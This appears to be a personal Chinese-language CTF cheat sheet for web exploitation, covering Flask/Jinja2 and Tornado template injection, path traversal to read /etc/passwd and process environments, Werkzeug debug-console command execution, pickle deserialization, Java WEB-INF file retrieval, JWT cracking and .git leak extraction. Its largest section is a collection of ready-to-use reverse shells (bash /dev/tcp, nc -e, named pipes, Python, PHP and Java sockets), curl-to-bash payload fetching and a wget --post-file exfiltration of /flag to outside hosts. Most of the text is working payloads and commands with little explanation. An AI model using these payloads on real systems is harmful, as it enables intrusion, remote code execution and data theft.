flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'

原题目通过lfi, 文件穿越
/downloadj?image=1.jpg
/downloadj?image=../../../../../../../etc/passwd/

查看程序环境变量
/downloadj?image=../../../../../../../proc/self/environ
看到secret_key
```

### PIN码

debug 开启 才有PIN码问题

```html
{{...}}报错
```
得到，PIN码怎样访问？

```html
name={{...}} 看报错信息，
```

找一行，点右边的terminal图标，输入PIN码。进入console。

```python
## console中执行
import os
os.system('ls') # 并没有得到返回输出全部内容，返回了0.只得到返回值
os.popen('ls').read() # 得到了结果。
os.popen('ls /').read()
os.popen('ls /app').read() # 发现 flag
os.popen('cat /app/flag').read()
## 也可以写个反向shell，拿到更多权限。
```

### ssti注入

测试

<pre>/hello?name=

{% for i in range(10) %}

{% print(i) %}

{% endfor %}

</pre>

输出了结果，说明有漏洞

```python
/hello?name={{config.__class__.__init__.__globals__['os'].popen('cat ../app/flag').read()}}
/hello?name={{"".__class__}} 返回str
/hello?name={{"".__class__.__base__}}
/hello?name={{"".__class__.__base__.__subclasses__()}}
/hello?name={{"".__class__.__base__.__subclasses__()[302]}} # popen
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__}}
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__}}
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("ls").read()}}
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("ls /").read()}}
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("ls /app").read()}}
/hello?name={{"".__class__.__base__.__subclasses__()[302].__init__.__globals__["os"].popen("cat /app/flag").read()}}
[].__class__.__base__.__subclasses__()[58].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag.txt').read()")
# python2 input漏洞
__import__('os').popen('cat /flag.txt').read()
### appconfig
__class__.__init__.__globals__[app].config
?err=pfn&back={0.__class__.__init__.__globals__}   # 等于 pnf.__class__.__init__.__globals__
```

方式2
```py
# 读取app.py  -- [GYCTF2020]FlaskApp
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('app.py','r').read()}}{% endif %}{% endfor %}
# 读目录 ls/
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}
# 拼接大法
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')}}{% endif %}{% endfor %}
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()}}{% endif %}{% endfor %}
```

生产环境不要开debug模式
### ssti注入_tornado

[2018护网杯easy_tornado(BUUCTF提供复现)](https://blog.csdn.net/zz_Caleb/article/details/101473013)

那么tornado中的cookie通过handler.settings对象

handler 指向RequestHandler
而RequestHandler.settings又指向self.application.settings
所有handler.settings就指向RequestHandler.application.settings了！

传递error?msg={{ handler.settings }}得到：

'cookie_secret': 'b8e09977-6541-498b-9a30-08e3118b6e60'}

filehash: md5(cookie_secret+md5(filename))

## pickle 反序列化
见 2021中国能源网络信息安全大赛 ezpy
https://www.cnblogs.com/twosmi1e/p/15413391.html
https://www.freebuf.com/articles/web/291784.html

用pker 生成的opcodes
https://github.com/eddieivan01/pker

将下面写入x文件
```python
b = GLOBAL('__main__', 'b')
b.name = 'kleinor'
b.sex = 'kleinor'
b.age = 'kleinor'
people = INST('__main__', 'people', 'kleinor', 'kleinor', 'kleinor')
return people
```

`python3 pker.py < x`

脚本见 web_pickle_payload.py

# Java项目

Java项目 WEB-INF/web.xml  见[[ROARCTF 2019]EASY JAVA](https://www.freesion.com/article/9774220249/)

WEB-INF主要包含一下文件或目录:

    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。
    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中
    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件
    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。
    /WEB-INF/database.properties：数据库配置文件
    漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码

构造PAYLOAD:

    filename=WEB-INF/classes/com/wm/ctf/FlagController.class

`[网鼎杯 2020 青龙组]filejava`

```
    ../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
    <servlet>
        <servlet-name>UploadServlet</servlet-name>
        <servlet-class>cn.abc.servlet.UploadServlet</servlet-class>
    </servlet>
    访问servlet,下载反编译
    ../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/UploadServlet.class
```

## Java反序列化
[一道关于Java反序列化的CTF题-东华杯ezgadget](https://www.bilibili.com/video/BV1qb4y187FA)


# 其他内容
## JWT
http://jwt.io
工具： https://github.com/brendan-rius/c-jwt-cracker

3部分构成：
```json
{"alg":"HS256","typ":"JWT"}{"username":"123456"}wÈRîwqerwqe
1. 算法 2. payload 3. 签名
```
```
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiMCI6IiIsImp0aSI6IjgxOTFjOGVjMzA0ZTYxMDhlYmJhODJmZDEzM2IxMDAzIn0.eLzDmGFdvvALEZ4UR1ZSj21ZmW23W2oC5h3jRudNldc 0123456789 6
./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
```
## .git 泄漏

扫描 发现 .git 目录，

使用Web_Git_Extract-master.zip 提取

python2 git_extract.py http://106.75.72.168:9999/.git/
python2 githack.py http://106.75.72.168:9999/.git/

和  http://106.75.72.168:9999/flag.js 对比得到结果。

## Curl发送请求
`curl -v -X CTFHUB http://challenge-d8eeddbeb7a64576.sandbox.ctfhub.com:10080/index.php`

## 地址猜想
phpmyadmin 地址

    http://pma.wechall.com
    http://pma.wechall.net
    https://pma.wechall.net

## linux命令



## 反弹Shell
https://www.cnblogs.com/xiaozi/p/13493010.html
说明：端口可任意，但要保持一致而且不能被占用，以下均为攻击机登录被攻击机

nc参数
```
        -l              listen mode, for inbound connects
        -L              listen harder, re-listen on socket close
        -v              verbose [use twice to be more verbose]
```

__bash连接__
```
攻击机器输入 nc -lvp 7777
被攻击机器输入 
   bash -i >& /dev/tcp/攻击机ip/7777 0>&1 
   /bin/bash -i >& /dev/tcp/攻击机ip/7777 0>&1 
   不要在zsh测试 
```
然后攻击机器就相当于登陆了了被攻击机器

__curl连接__
```
监听 nc -lvp 7777

在攻击机根目录下创建shell.txt,内容为bash -i >& /dev/tcp/攻击机ip/7777 0>&1

//注意shell.txt不是在服务器根目录，而是例如/var/www/html下
被攻击机执行curl 攻击机ip/shell.txt|bash  //先curl获得shell.txt的内容然后用bash执行
curl 192.168.1.20|bash
```


__nc连接__
说明：用nc连接成功后不会出现类似bash连接那种开头的root@kali这种，可用pwd检测是否连接成功

__利用攻击机ip__
```
攻击机输入 nc -lvp 7777

被攻击机输入 nc -e /bin/bash 攻击机ip 7777
           nc 127.0.0.1 7777 -e c:\windows\system32\cmd.exe   // Windows
```

__nc连接无-e参数__
```
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc wgf4242.51vip.biz 39672 1>/tmp/backpipe
```

__利用被攻击机ip__

其他都是需要攻击机ip，这个则相反。我的理解是需要攻击机ip的相当于把shell弹给攻击机(所以攻击机ip和bash在一行代码)，而这个相当于在本地端口开个shell,攻击机访问端口来拿shell

```
攻击机输入 nc 被攻击机ip 7777

被攻击机输入  nc -lvp 7777 -e /bin/bash
```

python
1.

```
vps攻击机：nc -lvp 6666
靶机：python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.32.1",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```


2.
攻击机
```py
#!/usr/bin/python
#-*- coding: utf-8 -*-
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.20.151",7777)) #更改localhost为自己的外网ip,端口任意
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```
客户机
```
curl 192.168.1.20/shell.py|python
```

__php__

```
vps攻击机：nc -lvp 6666
靶机：php -r '$sock=fsockopen("192.168.32.1",6666);exec("/bin/sh -i <&3 >&3 2>&3");'
```

__wget__ 反弹shell

```
靶机:
wget --post-file /flag http://ip:port/
wget http://wgf4242.51vip.biz/shell.txt -O /tmp/x.php && php /tmp/x.php 
wget 192.168.20.130/shell.txt -O /tmp/x.php && php /tmp/x.php
http://xxx/wget?argv=1&argv=--post-file&argv=/flag&argv=http://wgf4242.51vip.biz:34578
vps攻击机: nc -lvp 2333
```

shell.txt内容
```
<?php
$sock=fsockopen("wgf4242.51vip.biz",39672);//localhost为自己的外网ip，端口任意
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```
python -m http.server --bind 0.0.0.0 8080

__java__ 反弹shell

```java
public class Revs {
public static void main(String[] args) throws Exception {
        Runtime r = Runtime.getRuntime();
        String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/192.168.99.242/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"};
        Process p = r.exec(cmd);
        p.waitFor();
    }
}
```

### 无公网IP反弹shell

https://www.bilibili.com/video/BV1pq4y1U7CR

方法1:
花生壳开 127.0.0.1 54321端口 得到tcp://397j302b56.zicp.vip:37932
本机nc -lvvnp 54321
远程 /?c=system("nc wgf4242.51vip.biz 39672 -e /bin/sh");

方法2:
花生壳开虚拟机地址 192.168.0.102 54321 得到tcp://397j302b56.zicp.vip:37932
本机A IP是192.168.0.100, 电脑B 192.168.0.100, 虚拟机C属于电脑B是192.168.247.128
如何让A与C互通
虚拟机C nc -lvvnp 54321
花生壳PC$ netsh interface portproxy add v4tov4 listenaddress=192.168.0.102 listenport=54321 connectaddress=192.168.247.128 connectport=54321

bash -i >& /dev/tcp/397j302b56.zicp.vip/22599 0>&1
